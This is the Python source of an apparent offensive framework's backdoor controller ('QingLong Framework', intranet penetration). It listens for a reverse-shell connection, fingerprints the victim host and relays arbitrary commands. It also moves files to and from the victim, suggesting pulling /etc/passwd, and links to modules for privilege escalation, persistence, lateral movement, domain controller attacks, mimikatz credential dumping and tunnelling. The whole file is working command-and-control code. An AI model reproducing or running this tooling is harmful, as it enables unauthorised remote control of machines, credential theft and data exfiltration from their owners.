import os
import struct
import sys
import threading
import socket
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI

sys.path.append(os.path.dirname(os.path.realpath(__file__)))
from IntranetPenetration.mimikatz import mimikatz
from IntranetPenetration.HorizontalMovement import HorizontalMovement_main
from IntranetPenetration.PermissionMaintenance import PermissionMaintenance_main
from IntranetPenetration.DomainControllerSecurity import DomainControllerSecurity_main
from IntranetPenetration.SmallTools import SmallTools
from IntranetPenetration.PrivilegeElevation import PrivilegeElevation_main
from IntranetPenetration.Tunnel import Tunnel_main
from IntranetPenetration.Informations import Informations_main
from AuxiliaryFunctions import MyTable


class Attacker(threading.Thread):
    def __init__(self, choice):
        super(Attacker, self).__init__()
        serverAddr = (choice.split()[1], int(choice.split()[2]))
        serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            serverSocket.bind(serverAddr)
            serverSocket.listen(10)
        except socket.error as message:
            print(message)
        except KeyboardInterrupt:
            print("exiting......")
        self.conn, self.addr = serverSocket.accept()
        self.ip = self.addr[0]  # ip地址

    # 后门关闭函数
    def session_close(self):
        self.conn.close()

    # 信息函数,返回ip、用户名、主机名、系统信息
    def info(self):
        public_ip = self.receive(self.conn, "curl ifconfig.me")
        if public_ip == '\033[1;31;31m' + "[-] Command execution failed!" + '\033[0m':
            public_ip = "None"
        system_name = self.receive(self.conn, "wmic os get caption,version")
        username = self.receive(self.conn, "whoami")
        hostname = self.receive(self.conn, "hostname")
        return self.ip, public_ip, username, hostname, system_name

    def show_functions(self):
        print("\n" + '\033[1;34;34m' + "Intranet Penetration" + '\033[0m' + "\n" + '=' * len(
            "Intranet Penetration") + "\n")
        headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m',
                   '\033[1;34;34m' + "description" + '\033[0m']
        mydata = [["1", "Domain Information Collection", "域信息收集模块"],
                  ["2", "Permission Escalation", "权限提升模块"],
                  ["3", "Permission Maintenance", "权限维持模块"],
                  ["4", "Domain Lateral Movement Attack", "域横向移动攻击模块"],
                  ["5", "Domain Controller Security", "域控制器安全模块"],
                  ["6", "Mimikatz", "mimikatz模块"],
                  ["7", "Small Tools", "小工具模块"],
                  ["8", "Tunnel", "隧道模块"]]
        MyTable.createTable(headers, mydata)

    # 执行主体函数
    def exec(self):
        super(Attacker, self).__init__()  # 删除这个会导致会话删除失败
        commands = ["upload", "download", "show functions", "back"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI(
            '\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor] \033[0m')
        print('\033[1;32;32m' + "[+] The reverse backdoor has been successfully launched!" + '\033[0m')
        print('\033[1;32;32m' + "[+] Type \"show functions\" to learn more details." + '\033[0m')
        while True:
            try:
                command = prompt(formatted_text1, completer=completer)
                if command.lower() == 'show functions':
                    self.show_functions()
                    print('\033[1;34;34m' + "[*] Select the serial number to enter the function module." + '\033[0m')
                    print(
                        '\033[1;34;34m' + "[*] Way to upload/download files => upload /etc/passwd | download /etc/passwd." + '\033[0m')
                    continue
                elif command == 'back':
                    break
                elif command == "":
                    continue
                elif command.split()[0] == 'upload' or command.split()[0] == 'download':
                    self.TransferFiles(self.conn, self.addr, command)
                    continue
                elif command == '1':
                    os.chdir("IntranetPenetration/Informations")
                    information = Informations_main.information(self.conn)
                    os.chdir("../../")
                    continue
                elif command == '2':
                    # 切换目录
                    os.chdir("IntranetPenetration/PrivilegeElevation")
                    privilege_elevation = PrivilegeElevation_main.PrivilegeElevation(self.conn)
                    os.chdir("../../")
                elif command == '3':
                    os.chdir("IntranetPenetration/PermissionMaintenance")
                    permission_maintenance = PermissionMaintenance_main.PermissionMaintenance(self.conn)
                    os.chdir("../../")
                    continue
                elif command == '4':
                    # 切换目录
                    os.chdir("IntranetPenetration/HorizontalMovement")
                    horizontal_movement = HorizontalMovement_main.HorizontalMovement(self.conn)
                    os.chdir("../../")
                    continue
                elif command == '5':
                    domain_controller_security = DomainControllerSecurity_main.DomainControllerSecurity(self.conn)
                    continue
                elif command == '6':
                    os.chdir("IntranetPenetration/mimikatz")
                    mimkatz = mimikatz.mimikatz(self.conn)
                    os.chdir("../../")
                    continue
                elif command == '7':
                    os.chdir("IntranetPenetration/SmallTools")
                    small_tools = SmallTools.SmallTools(self.conn)
                    os.chdir("../../")
                    continue
                elif command == '8':
                    tunnel = Tunnel_main.Tunnel(self.conn)
                    continue
                else:
                    self.conn.sendall(command.encode("gbk"))
                    result_len = self.conn.recv(4)
                    real_len = struct.unpack("i", result_len)[0]
                    while True:
                        if 1024 < real_len:
                            result = self.conn.recv(1024).decode("gbk", errors="ignore")
                            print(result)
                            real_len = real_len - 1024
                            continue
                        else:
                            result = self.conn.recv(1024).decode("gbk", errors="ignore")
                            print(result)
                            break
                    continue
            except:
                print('\033[1;34;34m' + "[-] something wrong!" + '\033[0m')
                continue

    # 文件下载和上传函数
    def TransferFiles(self, conn, addr, command):
        while True:
            # 对命令进行分割
            commandList = command.split()
            # 若方法为download表示主控端端需要获取被控端的文件
            if commandList[0] == 'download':
                self.DownloadFile(conn, addr, command)
                break
            elif commandList[0] == 'upload':
                self.UploadFile(conn, addr, command)
                break

    # 文件上传函数
    def UploadFile(self, conn, addr, command):
        # 把主控端的命令发送给被控端
        conn.sendall(command.encode())
        # 从命令中分离出要上传文件的路径
        commandList = command.split()
        while True:
            uploadFilePath = commandList[1]
            if os.path.isfile(uploadFilePath):
                fileInfo = struct.pack('128sq', bytes(os.path.basename(uploadFilePath).encode('utf-8')),
                                       os.stat(uploadFilePath).st_size)
                conn.sendall(fileInfo)
                print('\033[1;32;32m' + '[+] Successfully sent file information => (name:{0} size:{1}).'.format(
                    os.path.basename(uploadFilePath), os.stat(uploadFilePath).st_size) + '\033[0m')
                # 开始传输文件的内容
                print('\033[1;32;32m' + '[+] uploading...' + '\033[0m')
                with open(uploadFilePath, 'rb') as f:
                    while True:
                        # 分块多次读，防止文件过大一次性读完导致内存不足
                        data = f.read(1024)
                        if not data:
                            print('\033[1;32;32m' + "[+] File uploaded successfully!" + '\033[0m')
                            break
                        conn.sendall(data)
                    break

    # 文件下载函数
    def DownloadFile(self, conn, addr, command):
        # 把主控端的命令发送给被控端端
        conn.sendall(command.encode())
        while True:
            fileInfo = conn.recv(struct.calcsize('128sq'))
            if fileInfo:
                fileName, fileSize = struct.unpack('128sq', fileInfo)
                # 要把文件名后面的多余无意义的空字符去除
                fileName = fileName.decode().strip('\00')
                # 定义上传文件的存放路径   ./表示当前目录下
                newFilename = os.path.join('./', fileName)
                print('\033[1;32;32m' + '[+] Successfully received file information => (name:{0} size:{1}).'.format(
                    fileName, fileSize) + '\033[0m')
                # 接下来开始接收文件的内容
                # 表示已经接收到的文件内容大小
                recvdSize = 0
                print('\033[1;32;32m' + '[+] receiving...' + '\033[0m')
                with open(newFilename, 'wb') as f:
                    # 分次分块写入
                    while not recvdSize == fileSize:
                        if fileSize - recvdSize > 1024:
                            data = conn.recv(1024)
                            f.write(data)
                            recvdSize += len(data)
                        else:
                            # 剩下内容不足1024时，则把剩下的全部内容都接收写入
                            data = conn.recv(fileSize - recvdSize)
                            f.write(data)
                            recvdSize = fileSize
                            break
                print('\033[1;32;32m' + "[+] File reception completed!" + '\033[0m')
            break

    # 命令发送和接收函数.把结果返回，但是不回显
    def receive(self, conn, command):
        conn.sendall(command.encode("gbk"))
        result_return = ""
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                result_return += result
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                result_return += result
                break
        return result_return
